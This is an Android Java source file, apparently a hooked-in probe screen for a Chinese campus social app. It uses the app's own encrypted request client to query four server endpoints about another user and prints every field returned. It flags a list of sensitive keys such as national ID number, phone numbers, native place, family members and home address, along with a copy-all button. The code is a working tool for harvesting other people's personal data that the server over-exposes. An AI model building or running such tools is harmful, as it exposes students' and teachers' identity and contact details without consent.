package qx;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

import da.b;
import t9.j0;

/**
 * 「榨干Ta」弹窗：把觅Ta 链路上**服务端实际下发的值**全量摊开。
 *
 * 关键设计：请求走 App 自己的 Lda/b;（WebApiRequest），
 *   → 参数加密（native 六元组）与 baseInfoServlet 响应的 AES 解密都由原客户端负责，
 *     所以这里看到的 body 与官方页面看到的**完全一致**（不需要自己实现加密）。
 *
 * 查询序列（对当前目标）：
 *   ① baseInfoServlet?step=other&otheruuid=<目标>   ← 他人信息主接口（宽/窄行判定就看这里）
 *   ② wapController.jsp getSettings&step=getMITAWithOther ← 对方觅Ta开关
 *   ③ wapController.jsp judgeBlackList               ← 黑名单关系
 *   ④ wapController.jsp oriHd_ggym&step=GetTeaResume ← 教师公开简历（16 字段，含 sfzh/dh/jg）
 *
 * 合规：目标 uuid/jid 只来自用户自己点开的那个人的页面 Intent，不做任何枚举/遍历。
 */
public class ProbeActivity extends Activity {

    private static final String TAG = "qx";

    /** 页面只展示少数几个，其余全靠 Bean 解析面捞——这里点名标出来。 */
    private static final String[] SENSITIVE = {
            "sfzh", "sfzg", "dh", "sjh", "lxrdh", "lxryj", "jg", "csrq", "csd", "mz", "zzmm",
            "gkksh", "syd", "byzx", "cym", "xz", "nl", "gw", "zc", "yx", "zy", "rxnj", "ssbj",
            "xh", "userid", "uuid", "jtcyset", "jtcy", "jtdz", "dz", "jz", "email",
            // 教师/人事侧（454 的 step=other 对教师会下发这些键）
            "jsdm", "bm", "gangwei", "zhichen", "xueli", "xuewei", "xznj", "rxnf", "xxmc",
    };

    private TextView out;
    private TextView status;
    private final StringBuilder all = new StringBuilder();

    private String name = "", xb = "", bjmc = "", jid = "", uuid = "", utype = "", host = "", raw = "";
    /** ① 响应里拿到的教师号（t 开头），用于拼 ④ 的 jsid 候选。 */
    private String jsdm = "";
    private boolean teacherQueued = false;
    private List<Q> queue = new ArrayList<Q>();
    private int idx = 0;

    /** 一条待发请求。 */
    static final class Q {
        final String label;
        final String url;
        final String method;
        final HashMap<String, String> params;

        Q(String label, String url, String method, HashMap<String, String> params) {
            this.label = label;
            this.url = url;
            this.method = method;
            this.params = params;
        }
    }

    /** 宿主页面 → 本弹窗（由 ProbeHook 调用）。 */
    public static void open(Activity host, Intent data) {
        Intent i = new Intent(host, ProbeActivity.class);
        if (data != null) {
            i.putExtras(data);
        }
        host.startActivity(i);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setTitle("榨干Ta · 能查到的值");
        buildUi();
        readExtras();
        resizeWindow();
        try {
            runAll();
        } catch (Throwable t) {
            // 链接期错误（混淆名对不上等）不能把页面打死——直接把异常摊在弹窗里
            Log.e(TAG, "runAll failed", t);
            headerLine("!! 初始化失败：" + t + "\n");
            status.setText("初始化失败（把这段截给开发者）");
        }
    }

    private void resizeWindow() {
        try {
            WindowManager.LayoutParams lp = getWindow().getAttributes();
            lp.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.94f);
            lp.height = (int) (getResources().getDisplayMetrics().heightPixels * 0.86f);
            getWindow().setAttributes(lp);
        } catch (Throwable t) {
            Log.w(TAG, "resize failed", t);
        }
    }

    private void buildUi() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.WHITE);   // 主题是深色 Dialog，正文深色字 → 自己铺白底
        int p = dp(10);
        root.setPadding(p, p, p, p);

        TextView head = new TextView(this);
        head.setTag("qx_header");
        head.setTextSize(13f);
        head.setTextColor(Color.parseColor("#000000"));
        root.addView(head);

        status = new TextView(this);
        status.setTextSize(12f);
        status.setTextColor(Color.parseColor("#8A2BE2"));
        status.setPadding(0, dp(6), 0, dp(6));
        root.addView(status);

        ScrollView sv = new ScrollView(this);
        sv.setLayoutParams(new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));
        out = new TextView(this);
        out.setTextSize(11f);
        out.setTypeface(Typeface.MONOSPACE);
        out.setTextIsSelectable(true);
        out.setTextColor(Color.parseColor("#222222"));
        sv.addView(out);
        root.addView(sv);

        LinearLayout bar = new LinearLayout(this);
        bar.setOrientation(LinearLayout.HORIZONTAL);
        bar.setGravity(Gravity.END);
        Button again = new Button(this);
        again.setText("重新查询");
        again.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                runAll();
            }
        });
        Button copy = new Button(this);
        copy.setText("复制全部");
        copy.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                copyAll();
            }
        });
        bar.addView(again);
        bar.addView(copy);
        root.addView(bar);

        setContentView(root);
    }

    private void copyAll() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            cm.setPrimaryClip(ClipData.newPlainText("qx-probe", all.toString()));
            Toast.makeText(this, "已复制 " + all.length() + " 字符", Toast.LENGTH_SHORT).show();
        } catch (Throwable t) {
            Toast.makeText(this, "复制失败: " + t, Toast.LENGTH_LONG).show();
        }
    }

    private void readExtras() {
        Bundle b = getIntent() == null ? null : getIntent().getExtras();
        if (b != null) {
            name = str(b, "qx_name");
            xb = str(b, "qx_xb");
            bjmc = str(b, "qx_bjmc");
            jid = str(b, "qx_jid");
            uuid = str(b, "qx_uuid");
            utype = str(b, "qx_type");
            host = str(b, "qx_host");
            raw = str(b, "qx_raw");
        }
        if (TextUtils.isEmpty(uuid)) {
            uuid = jid;
        }
        if (TextUtils.isEmpty(utype)) {
            utype = "STU";
        }
    }

    private static String str(Bundle b, String key) {
        String s = b.getString(key);
        return s == null ? "" : s;
    }

    // ───────────────────────── 查询 ─────────────────────────

    private void runAll() {
        idx = 0;
        all.setLength(0);
        jsdm = "";
        teacherQueued = false;
        queue = new ArrayList<Q>();
        if (out != null) {
            out.setText("");
        }

        String base = j0.a == null || j0.a.serviceUrl == null
                ? "" : j0.a.serviceUrl;
        String myId = j0.a == null || j0.a.userid == null ? "" : j0.a.userid;
        String myType = j0.a == null || j0.a.usertype == null ? "" : j0.a.usertype;

        header("来源页面：" + dash(host) + "\n目标：" + dash(name) + "｜性别 " + dash(xb) + "｜班级 " + dash(bjmc)
                + "\nJID：" + dash(jid) + "｜uuid：" + dash(uuid) + "｜身份 " + dash(utype)
                + "\n自己：" + dash(myId) + " / " + dash(myType)
                + "｜serviceUrl：" + dash(base));

        if (TextUtils.isEmpty(base)) {
            status.setText("未登录 / 拿不到 serviceUrl —— 请先登录再打开本页");
            render();
            return;
        }
        if (!TextUtils.isEmpty(raw)) {
            headerLine("── 宿主页面收到的原始 extras ──\n" + raw);
        }

        HashMap<String, String> m1 = new HashMap<String, String>();
        m1.put("userId", myId);
        m1.put("usertype", myType);
        m1.put("step", "other");
        m1.put("otheruuid", uuid);
        queue.add(new Q("① 他人信息 baseInfoServlet step=other（主接口）",
                base + "/wap/baseInfoServlet", "GET", m1));

        // ② 官方客户端两处写法不一致：e2/a 用「自己的」usertype，u8/v 用「对方的」usertype
        //    → 两个都发，看服务端认哪个（其它参数完全相同）
        HashMap<String, String> m2 = new HashMap<String, String>();
        m2.put("action", "getSettings");
        m2.put("step", "getMITAWithOther");
        m2.put("userId", myId);
        m2.put("usertype", myType);
        m2.put("other", uuid);
        queue.add(new Q("②a 对方觅Ta开关 getMITAWithOther（usertype=自己 " + dash(myType) + "）",
                base + "/wap/wapController.jsp", "GET", m2));

        if (!TextUtils.isEmpty(utype) && !utype.equals(myType)) {
            HashMap<String, String> m2b = new HashMap<String, String>(m2);
            m2b.put("usertype", utype);
            queue.add(new Q("②b 同上（usertype=对方 " + utype + "）",
                    base + "/wap/wapController.jsp", "GET", m2b));
        }

        HashMap<String, String> m3 = new HashMap<String, String>();
        m3.put("action", "judgeBlackList");
        m3.put("userId", myId);
        m3.put("usertype", myType);
        m3.put("touserId", jid);
        m3.put("tousertype", utype);
        queue.add(new Q("③ 黑名单 judgeBlackList",
                base + "/wap/wapController.jsp", "GET", m3));

        runNext();
    }

    /**
     * ④ 教师简历：官方调用点是 native，看不到它拿什么当 jsid
     * （① 响应里同时有 jsdm=t1001122 这种教师号 和 userid=10250137 这种平台号）。
     * ⇒ 两个候选都发一遍，由服务端回答哪个对。① 回来后才入队。
     */
    private void enqueueTeacherQueries() {
        if (teacherQueued) {
            return;
        }
        teacherQueued = true;
        String base = j0.a == null || j0.a.serviceUrl == null ? "" : j0.a.serviceUrl;
        String myId = j0.a == null || j0.a.userid == null ? "" : j0.a.userid;
        String myType = j0.a == null || j0.a.usertype == null ? "" : j0.a.usertype;
        if (TextUtils.isEmpty(base)) {
            return;
        }
        boolean looksTeacher = (utype != null && utype.toUpperCase().contains("TEA"))
                || !TextUtils.isEmpty(jsdm);
        if (!looksTeacher) {
            headerLine("（目标身份 " + dash(utype) + "、① 里也没有 jsdm → 跳过教师简历查询）\n");
            return;
        }
        String fromJid = suffix(jid);
        String fromResp = jsdm;
        if (!TextUtils.isEmpty(fromResp) && !fromResp.equals(fromJid)) {
            queue.add(teacherQ(base, myId, myType, fromResp, "jsid=①里的 jsdm（教师号）"));
            queue.add(teacherQ(base, myId, myType, fromJid, "jsid=JID 后缀（平台号，=旧版发法）"));
        } else if (!TextUtils.isEmpty(fromJid)) {
            queue.add(teacherQ(base, myId, myType, fromJid, "jsid=JID 后缀"));
        }
    }

    private Q teacherQ(String base, String myId, String myType, String jsid, String note) {
        HashMap<String, String> m = new HashMap<String, String>();
        m.put("action", "oriHd_ggym");
        m.put("step", "GetTeaResume");
        m.put("userId", myId);
        m.put("usertype", myType);
        m.put("userid", suffix(myId));
        m.put("jsid", jsid);
        return new Q("④ 教师简历 GetTeaResume（" + note + "）",
                base + "/wap/wapController.jsp", "GET", m);
    }

    private void runNext() {
        if (idx >= queue.size()) {
            status.setText("查询完成（" + queue.size() + "/" + queue.size() + "）——「复制全部」可把全文拷走");
            render();
            return;
        }
        final Q q = queue.get(idx);
        status.setText("查询中 " + (idx + 1) + "/" + queue.size() + "：" + q.label);
        headerLine("\n═══ " + q.label + "\n" + q.method + " " + q.url + "\n参数 " + q.params + "\n");
        render();
        try {
            b req = new b(this);
            req.B(q.url);
            req.y(q.params);
            req.A(q.method);
            req.v(new Cb());
            req.q(this, "qxprobe", b.e.a);
        } catch (Throwable t) {
            headerLine("!! 发起请求就失败: " + t + "\n");
            idx++;
            runNext();
        }
    }

    /** da.b.f 回调：结果落到 UI 线程再继续下一条。 */
    private final class Cb implements b.f {

        @Override
        public void callback(String body) {
            finish(body, null);
        }

        @Override
        public void callbackError(Exception exc) {
            finish(null, exc);
        }

        @Override
        public boolean validate(String str) {
            return true;
        }

        private void finish(final String body, final Exception err) {
            final int i = idx;
            final String block = format(body, err);
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    headerLine(block);
                    if (i == 0) {
                        // ① 回来了：抓到 jsdm 才能把 ④ 的 jsid 候选凑齐
                        enqueueTeacherQueries();
                    }
                    idx++;
                    runNext();
                }
            });
        }
    }

    /** 原始响应 + 解析键值 + 敏感键命中提示——宽/窄行一眼可见。 */
    private String format(String body, Exception err) {
        StringBuilder sb = new StringBuilder("── 响应 ──\n");
        if (err != null) {
            sb.append("!! 异常: ").append(err).append('\n');
        }
        if (body == null || body.length() == 0) {
            sb.append("(空响应)\n");
            return sb.toString();
        }
        sb.append(body).append('\n');
        try {
            JSONObject o = new JSONObject(body);
            if (o.has("jsdm")) {
                String v = o.optString("jsdm");
                if (!TextUtils.isEmpty(v)) {
                    jsdm = v;
                }
            }
            int n = 0;
            StringBuilder keys = new StringBuilder();
            StringBuilder hits = new StringBuilder();
            Iterator<String> it = o.keys();
            while (it.hasNext()) {
                String k = it.next();
                String v = o.optString(k);
                n++;
                keys.append("  ").append(k).append(" = ").append(v)
                        .append(TextUtils.isEmpty(v) ? "   ← 键在值空" : "").append('\n');
                for (String s : SENSITIVE) {
                    if (s.equalsIgnoreCase(k)) {
                        hits.append(k).append(TextUtils.isEmpty(v) ? "(空)" : "(有值)").append(' ');
                        break;
                    }
                }
            }
            sb.append("── 解析（顶层 ").append(n).append(" 键）──\n").append(keys);
            sb.append("敏感键命中：").append(hits.length() == 0 ? "（无）" : hits.toString()).append('\n');
            if (o.has("msg")) {
                sb.append("服务端 msg：").append(o.optString("msg")).append('\n');
            }
            if (o.has("resultSet") || o.has("state") || o.has("flag")) {
                // 客户端消费面（权威口径）：xm/xb/xxdm/xh|jsdm|userid/ssbj/state
                sb.append("判定：").append(n > 7 ? "宽行" : "窄行")
                        .append("（顶层 ").append(n).append(" 键；官方客户端只消费 7 个路由字段）\n");
            }
            if (o.has("resultSet")) {
                String rs = o.optString("resultSet");
                sb.append("resultSet 原始：").append(rs).append('\n');
            }
        } catch (Throwable t) {
            sb.append("(响应不是 JSON：" + t + ")\n");
        }
        return sb.toString();
    }

    // ───────────────────────── 小工具 ─────────────────────────

    private void header(String s) {
        headerLine(s + "\n");
        render();
    }

    private void headerLine(String s) {
        all.append(s);
        render();
    }

    private void render() {
        if (out != null) {
            out.setText(all.toString());
        }
    }

    private static String dash(String s) {
        return TextUtils.isEmpty(s) ? "—" : s;
    }

    private static String suffix(String s) {
        if (s == null) {
            return "";
        }
        int i = s.indexOf('_');
        return i < 0 ? s : s.substring(i + 1);
    }

    private int dp(int v) {
        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, v,
                getResources().getDisplayMetrics());
    }
}
